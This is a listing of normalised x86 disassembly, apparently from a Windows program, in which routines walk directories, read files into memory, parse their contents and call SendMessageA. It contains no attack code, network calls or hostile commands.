mov eax [ esp + 0xd4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp al 0xd
je r-xdata
mov [ esp + 0x98 ] al
mov edx [ esp + 0x98 ]
push edx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_4017f0
mov al [ esi + edi + 0x1 ]
inc esi
mov [ esp + 0x88 ] al
mov ecx [ esp + 0x88 ]
push ecx
jmp r-xdata
lea ecx [ esp + 0x5c ]
call sub_40c960
mov edx [ rw-data ]
mov ecx [ esp + 0x10 ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov eax [ eax + ebp + 0x60 ]
lea esi [ ecx + eax ]
lea ecx [ esp + 0x5c ]
call sub_40c960
mov ecx eax
lea edi [ ecx + 0x1 ]
mov eax [ esp + 0x80 ]
mov ecx [ esp + 0x84 ]
mov [ esi + ebx * 8 ] eax
mov [ esi + ebx * 8 + 0x4 ] ecx
jmp r-xdata
mov ecx [ esi + ebx * 8 + 0x4 ]
cmp ecx edi
je r-xdata
mov ecx [ esp + 0x9c ]
jmp r-xdata
mov ecx [ esi + ebx * 8 + 0x4 ]
test ecx ecx
je r-xdata
movzx edi [ esp + 0x60 ]
jmp r-xdata
mov edi [ esp + 0x60 ]
jmp r-xdata
fld [ esp + 0x60 ]
call sub_4b64c4
mov edi eax
jmp r-xdata
mov edi [ esp + 0x78 ]
jmp r-xdata
cmp [ esp + 0x7c ] 0x10
jb r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
cmp [ esp + 0x58 ] 0x10
mov [ esp + 0xcc ] esi
mov [ esp + 0xc8 ] edi
mov [ esp + 0xb8 ] 0x0
mov [ esp + 0x10120 ] 0x1
jb r-xdata
mov ecx [ esp + 0xb8 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x38 ]
inc esi
cmp esi eax
jl r-xdata
cmp al 0xa
jne r-xdata
lea ecx [ esp + 0x44 ]
push 0x1
call sub_4017f0
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
push eax
mov ecx esi
call sub_401e80
mov edx [ rw-data ]
shl edx 0x4
mov ecx [ edx + rw-data ]
mov eax [ ecx + ebp + 0x60 ]
mov edx [ esp + 0x10 ]
cmp [ eax + edx + 0x18 ] 0x10
jb r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov [ esi + ebx * 8 + 0x4 ] edi
mov [ esi + ebx * 8 ] ecx
xor edi edi
dec [ ecx + 0x4 ]
jne r-xdata
mov [ esp + 0x9c ] 0x69
mov [ esp + 0xa0 ] edi
mov esi [ esi + ebp + 0x50 ]
cmp [ esi + ebx * 8 ] 0x63
mov [ esp + 0x10120 ] 0x7
jne r-xdata
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x68 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ rw-data ] 0x1
jne r-xdata
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] esi
mov [ esp + 0x44 ] 0x0
xor edi edi
mov edx [ esp + 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp al 0x22
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea edi [ eax + edx + 0x4 ]
mov edi [ eax + edx + 0x4 ]
jmp r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x18 ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
cmp [ esp + 0x3c ] 0x10
mov [ esp + 0x10120 ] 0x0
jb r-xdata
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov ecx [ eax + ebp + 0xc ]
cmp ecx edi
je r-xdata
cmp al 0x5c
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
mov ecx [ esp + 0xac ]
mov ecx [ esi + ebx * 8 + 0x4 ]
test ecx ecx
je r-xdata
mov [ esp + 0xac ] 0x73
mov [ esp + 0xb0 ] edi
mov esi [ ecx + ebp + 0x50 ]
cmp [ esi + ebx * 8 ] 0x63
mov [ esp + 0x10120 ] 0x9
jne r-xdata
push edi
push ebx
push 0x4ca
mov eax ecx
push eax
call [ SendMessageA@IAT ]
mov [ esp + 0x8c ] al
mov edx [ esp + 0x8c ]
push edx
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x48 ]
call sub_401cc0
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
sub_40f790
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4bf2a1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x203b4
call sub_4b6180
push ebx
push esi
push edi
push sub_403ab0
push sub_4038a0
push 0x5
push 0x10
lea eax [ esp + 0x188 ]
push eax
mov [ esp + 0x160 ] r--data
mov [ esp + 0x164 ] r--data
mov [ esp + 0x168 ] r--data
mov [ esp + 0x16c ] r--data
mov [ esp + 0x170 ] r--data
call sub_4b6874
xor edi edi
mov esi r--data
mov ebx 0xf
mov eax r--data
mov [ esp + 0x203cc ] edi
mov [ esp + 0x118 ] r--data
mov [ esp + 0x11c ] r--data
mov [ esp + 0x120 ] r--data
mov [ esp + 0x124 ] esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea ecx [ eax + 0x1 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x17c ]
mov [ esp + 0x203d0 ] 0x1
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x17c ]
mov [ esp + 0x203d0 ] 0x2
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x17c ]
mov [ esp + 0x203d0 ] 0x3
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x17c ]
mov [ esp + 0x203d0 ] 0x4
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x160 ] r--data
mov [ esp + 0x164 ] r--data
mov [ esp + 0x168 ] r--data
mov [ esp + 0x16c ] r--data
mov [ esp + 0x170 ] r--data
mov [ esp + 0x174 ] esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0x5
call sub_407460
mov eax [ esp + 0x28 ]
mov esi 0x10
cmp eax esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edi edi
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0x6
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0x7
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0x8
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0x9
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x18c ]
mov [ esp + 0x203d0 ] 0xa
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov esi r--data
mov eax r--data
mov [ esp + 0xd4 ] r--data
mov [ esp + 0xd8 ] esi
mov [ esp + 0xdc ] r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x19c ]
mov [ esp + 0x203d0 ] 0xb
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x19c ]
mov [ esp + 0x203d0 ] 0xc
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x19c ]
mov [ esp + 0x203d0 ] 0xd
call sub_407460
cmp [ esp + 0x28 ] 0x10
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x128 ] r--data
mov [ esp + 0x12c ] esi
mov [ esp + 0x130 ] r--data
mov [ esp + 0x134 ] r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x203d0 ] 0xe
call sub_407460
mov eax [ esp + 0x28 ]
mov esi 0x10
cmp eax esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x203d0 ] 0xf
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea ecx [ esp + 0x10 ]
push ecx
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x203d0 ] 0x10
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x14 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x1ac ]
mov [ esp + 0x203d0 ] 0x11
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
mov eax r--data
mov [ esp + 0x8c ] r--data
mov [ esp + 0x28 ] ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x203d0 ] 0x12
call sub_407460
cmp [ esp + 0x28 ] esi
mov [ esp + 0x203cc ] 0x0
jb r-xdata
lea edx [ esp + 0x160 ]
lea ecx [ esp + 0x118 ]
lea eax [ esp + 0xd4 ]
mov [ esp + 0x13c ] edx
lea edx [ esp + 0x8c ]
mov [ esp + 0x138 ] ecx
mov [ esp + 0x140 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ esp + 0x128 ]
mov [ esp + 0x148 ] edx
mov [ esp + 0x144 ] ecx
mov [ esp + 0x80 ] ebx
mov [ esp + 0x7c ] edi
mov [ esp + 0x6c ] 0x0
lea edx [ eax + 0x1 ]
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x70 ]
call sub_401e80
cmp [ esp + 0x80 ] esi
mov eax [ esp + 0x6c ]
mov [ esp + 0x203cc ] 0x13
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x6c ]
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
push 0x5c
push 0x1
lea ecx [ esp + 0x70 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x70 ]
call sub_401cc0
cmp [ esp + 0x80 ] esi
mov eax [ esp + 0x6c ]
jae r-xdata
lea ecx [ esp + 0x228 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x88 ] eax
jne r-xdata
lea eax [ esp + 0x6c ]
push r--data
lea ecx [ esp + 0x258 ]
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x80 ] esi
jb r-xdata
mov eax [ esp + 0x88 ]
lea edx [ esp + 0x228 ]
push edx
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ esp + 0x258 ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
push sub_403ab0
push 0x5
push esi
lea eax [ esp + 0x184 ]
push eax
mov [ esp + 0x90 ] ebx
mov [ esp + 0x8c ] edi
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x203dc ] 0xffffffff
call sub_4b6814
xor eax eax
mov ecx [ esp + 0x203c4 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x6c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x88 ]
push ecx
call [ FindClose@IAT ]
cmp [ esp + 0x80 ] esi
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] edi
mov [ esp + 0x44 ] 0x0
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push sub_403ab0
push 0x5
push esi
lea eax [ esp + 0x184 ]
push eax
mov [ esp + 0x90 ] ebx
mov [ esp + 0x8c ] edi
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x203dc ] 0xffffffff
call sub_4b6814
mov ecx [ esp + 0x203c4 ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x6c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esp + 0x48 ]
call sub_401e80
cmp [ esp + 0x58 ] esi
mov eax [ esp + 0x44 ]
mov [ esp + 0x203cc ] 0x14
jae r-xdata
push eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x44 ]
lea eax [ esp + 0x254 ]
lea edx [ eax + 0x1 ]
push 0x5c
push 0x1
lea ecx [ esp + 0x48 ]
call sub_4017f0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x258 ]
push ecx
lea ecx [ esp + 0x48 ]
call sub_401cc0
test [ esp + 0x228 ] 0x10
je r-xdata
push r--data
lea edx [ esp + 0x258 ]
push edx
call [ lstrlenA@IAT ]
lea eax [ esp + eax + 0x254 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
mov eax [ esp + 0x58 ]
jne r-xdata
cmp [ esp + 0x58 ] esi
mov eax [ esp + 0x44 ]
jae r-xdata
cmp eax esi
mov [ esp + 0x203cc ] 0x13
jb r-xdata
cmp eax esi
mov eax [ esp + 0x44 ]
jae r-xdata
push eax
call sub_40f790
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] edi
mov [ esp + 0x44 ] 0x0
mov ecx [ esp + 0x44 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
push edi
push edi
push 0x3
push edi
push edi
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ esp + 0x44 ]
mov eax [ esp + 0x58 ]
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
push 0x40
call [ GlobalAlloc@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x84 ] edi
jne r-xdata
cmp [ esp + 0x58 ] 0x10
mov [ esp + 0x203cc ] 0x13
jb r-xdata
push 0x0
lea ecx [ esp + 0x94 ]
push ecx
push ebx
push edi
push esi
call [ ReadFile@IAT ]
push esi
mov ebx eax
call [ CloseHandle@IAT ]
test ebx ebx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
mov esi 0x10
jmp r-xdata
mov edx [ esp + 0x44 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x90 ]
mov esi [ esp + 0x84 ]
lea ecx [ esp + 0x368 ]
mov [ edx + esi ] 0x0
call sub_44fb50
push esi
lea ecx [ esp + 0x36c ]
mov [ esp + 0x203d0 ] 0x15
call sub_44f660
or edi 0xffffffff
lea ecx [ esp + 0x368 ]
mov [ esp + 0x34 ] edi
mov [ esp + 0x30 ] 0x1
call sub_450270
test eax eax
je r-xdata
push edi
call [ GlobalFree@IAT ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x203cc ] 0x13
call sub_4480e0
mov ebx 0xf
xor edi edi
mov esi 0x10
jmp r-xdata
mov eax [ esp + 0x84 ]
push eax
call [ GlobalFree@IAT ]
lea ecx [ esp + 0x368 ]
mov [ esp + 0x203cc ] 0x14
call sub_44f5f0
mov ebx 0xf
xor edi edi
mov esi 0x10
jmp r-xdata
lea ecx [ esp + 0x368 ]
call sub_450380
cmp eax 0x7
jne r-xdata
cmp eax 0x1b
jne r-xdata
mov esi [ esp + 0x36c ]
lea ecx [ esp + 0x368 ]
call sub_450270
cmp esi [ esp + 0x36c ]
jne r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x368 ]
call sub_450380
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x368 ]
call sub_450270
test eax eax
jne r-xdata
lea ecx [ esp + 0x368 ]
call sub_450380
lea ecx [ esp + 0x368 ]
call sub_450270
cmp esi [ esp + 0x36c ]
je r-xdata
lea ecx [ esp + 0x368 ]
call sub_450270
cmp eax 0x3c
jne r-xdata
xor edi edi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
lea ecx [ esp + 0x368 ]
mov [ esp + 0x203cc ] 0x16
call sub_44fb10
push eax
lea ecx [ esp + 0x14 ]
call sub_402510
mov ecx rw-data
mov [ esp + 0x34 ] edi
call sub_40af70
test eax eax
jle r-xdata
jmp r-xdata
jmp r-xdata
lea ecx [ esp + 0x368 ]
call sub_450270
cmp eax 0x19
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor ebx ebx
mov esi 0x10
nop
cmp edi 0xffffffff
je r-xdata
mov ebx [ esp + 0x34 ]
mov esi [ rw-data ]
lea ebx [ ebx + ebx * 4 ]
shl ebx 0x5
lea ecx [ esp + 0x368 ]
add ebx esi
call sub_44fb10
push eax
lea ecx [ esp + 0x210 ]
call sub_4024d0
lea edi [ ebx + 0x2c ]
mov esi 0x1
mov ecx edi
mov [ esp + 0x203cc ] 0x17
mov [ esp + 0x30 ] esi
mov [ esp + 0x38 ] edi
call sub_4010c0
cmp eax esi
jle r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
lea eax [ ebx + eax + 0x14 ]
mov eax [ ebx + eax + 0x14 ]
jmp r-xdata
xor ebx ebx
mov [ esp + 0xd0 ] 0xf
mov [ esp + 0xcc ] ebx
mov [ esp + 0xbc ] bl
lea ecx [ esp + 0x368 ]
mov [ esp + 0x203cc ] 0x18
call sub_44fb10
push eax
lea ecx [ esp + 0xbc ]
call sub_402510
mov [ esp + 0x64 ] ebx
mov edi edi
mov ecx edi
call sub_4010c0
cmp esi eax
je r-xdata
mov edi 0x1c
lea ecx [ esp + 0x368 ]
call sub_450380
cmp eax 0x1c
lea ecx [ esp + 0x10 ]
jne r-xdata
or edi 0xffffffff
mov [ esp + 0x34 ] edi
cmp edi edx
jne r-xdata
mov [ esp + 0x34 ] edi
mov ecx rw-data
inc edi
add ebx 0xa0
call sub_40af70
cmp edi eax
jl r-xdata
push ecx
push eax
mov eax [ esp + 0x2c ]
push eax
push 0x0
lea ecx [ esp + 0x20 ]
call sub_401150
test eax eax
je r-xdata
cmp ebx 0x5
mov [ esp + 0x64 ] ebx
je r-xdata
inc ebx
cmp ebx 0x5
jb r-xdata
lea ecx [ esp + 0x20c ]
jmp r-xdata
lea ecx [ esp + 0x368 ]
call sub_450380
lea ecx [ esp + 0x20c ]
jmp r-xdata
mov edi [ esp + 0x38 ]
mov [ esp + 0x30 ] esi
mov ecx [ esp + 0x38 ]
inc esi
add edi 0x1c
call sub_4010c0
cmp esi eax
jl r-xdata
call sub_4480e0
mov [ esp + 0x203cc ] 0x15
call sub_4480e0
mov [ esp + 0x30 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ ebx + eax + 0x28 ] esi
mov ecx [ ebx + eax + 0x24 ]
jb r-xdata
lea ecx [ esp + 0xb8 ]
lea ecx [ esp + 0x368 ]
call sub_450380
cmp eax 0x19
jne r-xdata
mov eax [ esp + ebx * 4 + 0x14c ]
push eax
lea ecx [ esp + 0xbc ]
push ecx
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov [ esp + 0x203cc ] 0x15
call sub_4480e0
mov edi [ esp + 0x34 ]
mov eax [ ebx + 0x30 ]
add eax edi
push eax
lea edx [ esp + 0x210 ]
push edx
call sub_4013c0
add esp 0x8
test al al
jne r-xdata
mov esi [ esp + 0x34 ]
mov edi [ rw-data ]
lea esi [ esi + esi * 4 ]
shl esi 0x5
lea ecx [ esi + edi + 0x8c ]
call sub_40af40
mov ecx [ esp + 0x30 ]
cmp ecx eax
jge r-xdata
lea ecx [ esi + edi + 0x8c ]
call sub_40af40
dec eax
mov eax ecx
jmp r-xdata
lea ecx [ esp + 0xfc ]
call sub_4480e0
cmp edi 0x1
je r-xdata
mov ecx [ esi + edi + 0x90 ]
lea edx [ eax + eax * 4 ]
lea eax [ ecx + edx * 4 ]
mov [ eax ] ebx
shl ebx 0x4
lea ecx [ esp + ebx + 0x178 ]
mov [ esp + 0x60 ] ecx
push ecx
lea ecx [ eax + 0x4 ]
mov [ esp + 0x3c ] eax
call sub_40dd80
mov eax [ esp + 0x10374 ]
xor ebx ebx
mov [ esp + 0x3c ] 0x1
mov [ esp + 0x5c ] eax
mov [ esp + 0x2f ] bl
mov [ esp + 0x114 ] 0xf
mov [ esp + 0x110 ] ebx
mov [ esp + 0x100 ] bl
mov [ esp + 0x203cc ] 0x19
lea ecx [ ecx ]
cmp edi 0x2
jne r-xdata
cmp edi 0x1e
jne r-xdata
lea ecx [ esp + 0x368 ]
call sub_44fb10
push eax
lea ecx [ esp + 0x1f4 ]
call sub_4024d0
mov ecx [ esp + 0x60 ]
